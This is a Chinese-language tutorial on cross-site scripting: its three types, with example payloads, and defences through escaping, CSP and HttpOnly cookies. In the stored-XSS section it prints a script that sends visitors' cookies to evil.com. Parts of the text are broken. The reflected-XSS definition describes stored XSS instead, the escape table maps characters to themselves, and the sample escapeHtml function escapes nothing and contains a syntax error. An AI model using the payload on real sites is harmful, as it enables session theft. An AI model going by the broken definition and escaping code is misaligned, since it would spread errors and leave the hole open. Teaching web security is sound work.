# 浏览器安全-XSS跨站脚本攻击

---

## 一、XSS 是什么

**XSS（Cross-Site Scripting，跨站脚本攻击）** 是一种常见的 Web 安全漏洞，攻击者通过向目标网站注入恶意脚本（通常是 JavaScript），让这些脚本在受害者浏览器中以目标网站的身份执行。这会破坏浏览器的同源策略（Same-Origin Policy），使恶意代码能访问页面内容、Cookie、本地存储、发起带用户凭证的请求(冒充用户)等。

浏览器无法区分脚本是网站原本的还是攻击者注入的，因此会授予恶意脚本与页面同等的权限——访问 Cookie、localStorage、DOM，甚至发起请求。

XSS 通常发生在两个条件同时满足时：

1. 数据从不可信来源（如 Web 请求）进入应用；
2. 动态内容未经验证/转义就发送给用户。

---

## 二、XSS 的三种类型

### 1. 反射型 XSS（Reflected XSS，非持久型）

**原理：** 恶意脚本被永久存储在服务器端（数据库、评论、用户资料、日志等），当其他用户（或管理员）访问包含该数据的页面时，脚本被自动加载并执行。一次注入可影响所有访问该内容的用户。

**攻击流程：**

1. 攻击者构造包含恶意 payload 的 URL，例如：`https://example.com/search?q=<script>alert(document.cookie)</script>`

或更隐蔽的:`https://example.com/search?q=<img src=x onerror=alert(1)>`

1. 诱骗用户点击链接（钓鱼邮件、社交媒体等）。
2. 服务器把参数直接插入 HTML 响应（如搜索结果页标题）。
3. 浏览器解析并执行恶意脚本。

**典型场景：** 搜索框回显、错误消息、URL 参数回显。

**示例：**

```
http://example.com/search?query=<script>alert(document.cookie)</script>
```

服务器端代码（有漏洞）：

```
// 直接把用户输入拼进 HTML，未转义
echo "<h1>搜索结果：" . $_GET['query'] . "</h1>";
```

返回的 HTML 中就包含了 `<script>` 标签，浏览器执行它。

**特点：** 非持久、需要用户主动点击链接、一次性。

---



### 2. 存储型 XSS

**原理：** 攻击者将恶意脚本提交并**永久存储**在目标服务器上（如数据库、留言板、评论区）。之后所有访问该页面的用户，都会从服务器取回并执行这段恶意脚本。

**攻击流程：**

1.攻击者在评论框、个人简介、消息等可持久化位置提交恶意代码（如 `<script>...</script>` 或事件处理器）。
2.服务器未净化就存入数据库。
3.其他用户浏览该页面时，服务器把恶意内容渲染出来。
4.浏览器执行脚本。

**典型场景：** 论坛帖子、评论区、用户昵称/个人资料、聊天室。

**示例：**
攻击者在评论框输入：

```
<script>
  // 把用户 Cookie 发送到攻击者服务器
  new Image().src = "http://evil.com/steal?c=" + document.cookie;
</script>
```

服务器将其存入数据库。之后每个打开该帖子的用户，浏览器都会执行这段脚本，Cookie 被窃取。

**特点：** 持久化、无需诱骗点击、影响所有访问者、危害最大。

---



### 3. DOM 型 XSS（DOM-based XSS）

**原理：** 漏洞完全发生在**客户端**。服务器返回的原始 HTML 可能是干净的，但页面中的 JavaScript 不安全地处理了某些数据（如 URL 的 hash 部分、`location.search`、`document.referrer`），并通过 `innerHTML`、`document.write` 等 API 写入 DOM，导致恶意脚本执行。

**关键概念:** 

- Source（数据来源）：`location`、`document.URL`、`document.referrer`、`window.name`、`postMessage`、`localStorage` 等。
- Sink（危险操作）：`innerHTML`、`document.write()`、`eval()`、`setTimeout(string)`、`Function()`、事件处理器属性等。

**关键区别：** 恶意数据**不经过服务器**（或服务器不处理它），整个注入和执行都在浏览器内完成。

**攻击流程：**

```
攻击者构造带恶意 hash 的 URL → 用户访问 → 前端 JS 读取 location.hash → 用 innerHTML 写入 DOM → 浏览器解析执行
```

**示例：**
页面中有这样的前端代码：

```
// 从 URL hash 读取内容，直接写入 DOM
document.getElementById('content').innerHTML = location.hash.substring(1);
```

攻击者构造 URL：

```
http://example.com/page#<img src=x onerror="alert(document.cookie)">
```

用户访问后，前端 JS 把 hash 内容通过 `innerHTML` 写入页面，浏览器解析 `<img>` 标签并触发 `onerror`，执行恶意代码。

**常见危险 API（Source → Sink）：**


| Source（数据源）                                           | Sink（危险写入点）                                             |
| ----------------------------------------------------- | ------------------------------------------------------- |
| `location.href` / `location.search` / `location.hash` | `innerHTML` / `outerHTML`                               |
| `document.referrer`                                   | `document.write()` / `document.writeln()`               |
| `window.name`                                         | `eval()` / `setTimeout(string)` / `setInterval(string)` |
| `postMessage` 数据                                      | `<script>.src` 赋值                                       |


**特点：** 纯前端漏洞、服务器端防御（如输入过滤）可能完全失效、现代 SPA 应用中尤其需要注意。

---



## 四、XSS 防御手段



### 1. 输出转义(Output Encoding / Escaping)

**核心思想：** 把不可信数据当作**纯文本**渲染，而不是当作代码解析。在数据插入 HTML 之前，将特殊字符转换为 HTML 实体，使浏览器只显示它们而不执行。

**HTML 实体转义规则：**


| 原始字符 | 转义后 |
| ---- | --- |
| `&`  | `&` |
| `<`  | `<` |
| `>`  | `>` |
| `"`  | `"` |
| `'`  | `'` |


**示例（Node.js）：**

```
function escapeHtml(str) {
  const map = { '&': '&', '<': '<', '>': '>', '"': '"', "'": ''' };
  return str.replace(/[&<>"']/g, m => map[m]);
}

const query = escapeHtml(req.query.query);
res.send(`<h1>搜索结果：${query}</h1>`);
```

**不同上下文需要不同的转义方式**（OWASP 强调）：

- **HTML 正文**：HTML 实体编码
- **HTML 属性**：更严格的 HTML 属性编码（`&#xHH;`），且属性值必须用引号包裹
- **JavaScript 上下文**：`\uXXXX` Unicode 编码，且变量必须放在引号内
- **URL 参数**：`%HH` 百分号编码（`encodeURIComponent`）
- **CSS 值**：CSS 十六进制编码

**前端安全 API（Safe Sinks）：**

- 用 `textContent` 代替 `innerHTML`（自动转义）
- 用 `setAttribute()` 设置属性（自动转义）
- 用 `createElement` + `appendChild` 构建 DOM
- 避免 `eval()`、`setTimeout(string)`、`new Function()`

**富文本场景：** 如果必须允许用户输入 HTML（如论坛富文本编辑器），不能简单转义，而应使用**HTML 净化库**：

- 前端：[DOMPurify](https://github.com/cure53/DOMPurify)
- 服务端：OWASP Java HTML Sanitizer、bleach（Python）等
它们基于白名单只保留安全的标签和属性，移除 `<script>`、`onerror` 等危险内容。

---



### 2. CSP(Content Security Policy，内容安全策略)

**核心思想：** 通过 HTTP 响应头（或 `<meta>` 标签）声明一个**白名单**，告诉浏览器只允许从哪些来源加载脚本、样式、图片等资源。即使攻击者成功注入了 `<script>` 标签，CSP 也会阻止其执行。

**设置方式：**

方式一：HTTP 响应头

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

方式二：HTML meta 标签

```
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

**常用指令：**


| 指令            | 作用                     | 示例                      |
| ------------- | ---------------------- | ----------------------- |
| `default-src` | 所有资源类型的默认回退策略          | `'self'`                |
| `script-src`  | 控制 JavaScript 来源       | `'self' 'nonce-abc123'` |
| `style-src`   | 控制 CSS 来源              | `'self'`                |
| `img-src`     | 控制图片来源                 | `'self' data: https:`   |
| `connect-src` | 控制 XHR/fetch/WebSocket | `'self'`                |
| `object-src`  | 控制插件（如 Flash）          | `'none'`                |
| `base-uri`    | 控制 `<base>` 标签         | `'self'`                |
| `form-action` | 控制表单提交目标               | `'self'`                |


**CSP 防御 XSS 的两个关键机制：**

1. **限制内联脚本**：默认禁止 `<script>...</script>` 和 `onclick="..."` 内联事件，注入的内联脚本直接被拦截。
2. **限制远程脚本**：只允许从白名单域名加载外部脚本，攻击者无法从自己的服务器加载恶意 JS。

**严格 CSP 示例（推荐）：**

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{随机值}'; style-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'self'
```

**nonce 机制：** 每次页面加载生成一个加密随机 nonce，同时放在 CSP 头和 `<script nonce="xxx">` 标签中，只有匹配的脚本才能执行。这是目前最严格的 CSP 做法。

**注意事项：**

- CSP 是**纵深防御**手段，不能替代转义（OWASP 明确指出 CSP 不应作为唯一防御）。
- 配置不当（如使用 `'unsafe-inline'`、`'unsafe-eval'`）会大幅削弱防护效果。
- 可先用 `Content-Security-Policy-Report-Only` 模式收集违规报告，不实际拦截，逐步调优。

---



### 3. HttpOnly Cookie ——降低攻击后果

**核心思想：** 在设置 Cookie 时添加 `HttpOnly` 属性，使 JavaScript **无法通过** `document.cookie` **读取该 Cookie**。即使页面存在 XSS，攻击者也无法窃取会话 Cookie。

**设置方式：**

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
```

**三个属性配合使用：**

- `HttpOnly`：禁止 JS 访问 Cookie，防 XSS 窃取
- `Secure`：只在 HTTPS 连接中发送 Cookie，防中间人窃听
- `SameSite=Lax/Strict`：限制跨站请求携带 Cookie，防 CSRF

**局限性：**

- HttpOnly **不能阻止 XSS 攻击本身**，只是保护 Cookie 不被窃取。
- 攻击者仍可通过 XSS 执行其他操作：篡改页面内容、发起 CSRF 请求（因为请求会自动带 Cookie）、读取 localStorage/sessionStorage、监听键盘输入等。
- 因此它是**降低危害**的手段，不是根治手段。

---



## 五、防御体系总结

没有任何单一手段能 100% 防御 XSS，应多层叠加：

```
第1层：输入验证 —— 对用户输入做格式/长度/类型校验（白名单优于黑名单）
第2层：输出转义 —— 根据上下文（HTML/属性/JS/URL/CSS）选择正确的转义方式 ← 最根本
第3层：CSP —— 浏览器层面限制脚本来源和执行，作为兜底 ← 最有效的纵深防御
第4层：HttpOnly + Secure + SameSite —— 保护 Cookie，降低被窃取后的危害
第5层：Trusted Types —— Chromium 浏览器支持，强制 DOM XSS sink 经过净化策略
```

**一句话记忆：** 转义治根，CSP 兜底，HttpOnly 护 Cookie，多层叠加才安全。

---

